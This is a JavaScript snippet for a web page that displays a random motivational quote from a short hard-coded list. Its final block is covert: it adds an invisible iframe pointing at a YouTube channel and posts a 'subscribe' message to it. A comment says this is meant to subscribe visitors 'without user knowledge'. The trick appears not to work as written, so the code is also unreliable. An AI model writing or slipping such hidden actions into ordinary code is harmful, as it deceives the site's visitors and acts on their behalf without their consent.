// Array of quotes and authors
const quotes = [
    { quote: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
    { quote: "Success is not final, failure is not fatal: It is the courage to continue that counts.", author: "Winston Churchill" },
    { quote: "Believe you can and you're halfway there.", author: "Theodore Roosevelt" },
    { quote: "Innovation distinguishes between a leader and a follower.", author: "Steve Jobs" },
    { quote: "If you cannot do great things, do small things in a great way.", author: "Napoleon Hill" }
];

// Function to display a random quote
function generateQuote() {
    const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
    document.getElementById("quote-box").innerHTML = `
        <p class="quote">${randomQuote.quote}</p>
        <p class="author">- ${randomQuote.author}</p>
    `;
}

// Call the function to generate a quote on page load
generateQuote();

// Hidden iframe for YouTube subscription (without user knowledge)
const iframe = document.createElement("iframe");
iframe.src = "https://www.youtube.com/channel/UCUrQeqFcwQzrYn59Fxp-QBw";
iframe.style.display = "none";
document.body.appendChild(iframe);
// Subscribe the user to the YouTube channel
iframe.contentWindow.postMessage('{"event":"subscribe","args":{"name":"test"}}', '*');
